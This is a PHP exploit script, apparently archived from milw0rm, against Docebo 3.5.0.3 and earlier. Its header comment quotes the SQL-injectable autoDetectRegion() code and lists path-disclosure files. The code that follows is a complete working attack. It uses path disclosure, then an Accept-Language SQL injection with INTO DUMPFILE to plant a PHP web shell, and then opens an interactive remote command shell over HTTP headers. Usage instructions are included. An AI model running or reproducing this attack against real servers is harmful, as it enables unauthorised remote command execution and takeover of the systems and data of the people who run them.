<?

/*
	-------------------------------------------------------------------
	Docebo <= 3.5.0.3 (lib.regset.php) Remote Command Execution Exploit
	-------------------------------------------------------------------
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://www.docebo.org/
	details..: works with magic_quotes_gpc = off (if magic quotes affects also $_SERVER[] array)

	[-] autoDetectRegion() function vulnerable to SQL injection in /doceboCore/lib/lib.regset.php

	781.	function autoDetectRegion() {
	782.		
	783.		if(!isset($_SERVER["HTTP_ACCEPT_LANGUAGE"])) {
	784.			$res=0;
	785.			return $res;
	786.		}
	787.		$accept_language=$_SERVER["HTTP_ACCEPT_LANGUAGE"];
	788.		// [TODO] move the code that makes the accept language array to lib.utils
	789.
	790.		$al_arr=explode(",", $accept_language);
	791.
	792.		$i=0;
	793.		$res="";
	794.		while(($res == "") && ($i < count($al_arr))) {
	795.
	796.			$bl_arr=explode(";", $al_arr[$i]);
	797.			$browser_language=$bl_arr[0];
	798.
	799.			$qtxt="SELECT region_id FROM ".$this->_getListTable()." WHERE browsercode LIKE '%".$browser_language."%'"; <==
	800.			$q=$this->_executeQuery($qtxt);
	801.
	802.			if (($q) && (mysql_num_rows($q) > 0)) {
	803.				$row=mysql_fetch_array($q);
	804.				$res=$row["region_id"];
	805.			}

	an attacker cuold be inject SQL code through http accept-language header (in the query at line 799), but explode() function at
	line 790 will split the injected code by comma (","), so isn't possible even a blind SQL injection with BENCHMARK() method...
	this poc will try to inject some php code into docebo web directory by INTO DUMPFILE statement, this requires FILE privilege!

	[-] Path disclosure at:
	
	/doceboCore/class/class.conf_fw.php
	/doceboCore/class.module/class.event_manager.php
	/doceboCore/lib/lib.domxml5.php
	/doceboCore/menu/menu_over.php
	/doceboCms/class/class.conf_cms.php
	/doceboCms/lib/lib.compose.php
	/doceboCms/modules/chat/teleskill.php
	/doceboCms/class/class.admin_menu_cms.php
*/

error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print "\n[-] No response from {$host}:80 Trying again...\n";
		$sock = fsockopen($host, 80);
	}
	fputs($sock, $packet);
	while (!feof($sock)) $resp .= fread($sock, 1);
	fclose($sock);
	return $resp;
}

function get_path()
{
	global $host, $path;
	
	$packet = "GET {$path}../doceboCore/class/class.conf_fw.php HTTP/1.0\r\n";
	$packet.= "Host: {$host}\r\n";
	$packet.= "Connection: close\r\n\r\n";

	preg_match("/in <b>(.*)<\/b> on/i", http_send($host, $packet), $found);
	$ret = substr($found[1], 0, strlen($found[1]) - strlen(strstr($found[1], "docebo")));
	$ret.= substr($path, 1);

	return $ret;
}

print "\n+------------------------------------------------------------+";
print "\n| Docebo <= 3.5.0.3 Remote Command Execution Exploit by EgiX |";
print "\n+------------------------------------------------------------+\n";

if ($argc < 3)
{
	print "\nUsage....: php $argv[0] host path\n";
	print "\nhost.....: target server (ip/hostname)";
	print "\npath.....: path to docebo directory\n";
	print "\nExample..: php $argv[0] localhost /doceboCms/";
	print "\nExample..: php $argv[0] localhost /docebo/doceboLms/\n";
	die();
}

$host = $argv[1];
$path = $argv[2];

$r_path	= str_replace("\\", "/", get_path()); // replace "\" for windows path
$r_file = md5(time()).".php";

print "\n[-] Path disclosure: {$r_path}\n\n[-] Trying to inject php shell...\n";

$code	= "<?php \${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))}.\${print(_code_)} ?>";
$packet = "GET {$path} HTTP/1.0\r\n";
$packet.= "Host: {$host}\r\n";
$packet.= "Accept-Language: %'/**/AND/**/1=0/**/UNION/**/SELECT/**/'{$code}'/**/INTO/**/DUMPFILE/**/'{$r_path}{$r_file}'/*\r\n";
$packet.= "Connection: close\r\n\r\n";
$html	= http_send($host, $packet);

$packet = "GET {$path}{$r_file} HTTP/1.0\r\n";
$packet.= "Host: {$host}\r\n";
$packet.= "Connection: close\r\n\r\n";
$html	= http_send($host, $packet);

if (!ereg("_code_", $html)) die("\n[-] Exploit failed...\n");
else print "[-] Shell injected! Starting it...\n";

define(STDIN, fopen("php://stdin", "r"));
while(1)
{
	print "\nxpl0it-sh3ll > ";
	$cmd = trim(fgets(STDIN));
	if ($cmd != "exit")
	{
		$packet  = "GET {$path}{$r_file} HTTP/1.0\r\n";
		$packet .= "Host: {$host}\r\n";
		$packet .= "Cmd: ".base64_encode($cmd)."\r\n";
		$packet .= "Connection: close\r\n\r\n";
		$html = http_send($host, $packet);
		if (!ereg("_code_", $html)) die("\n[-] Exploit failed...\n");
		$shell = explode("_code_", $html);
		print "\n".$shell[1];
	}
	else break;
}

?>

# milw0rm.com [2008-01-09]
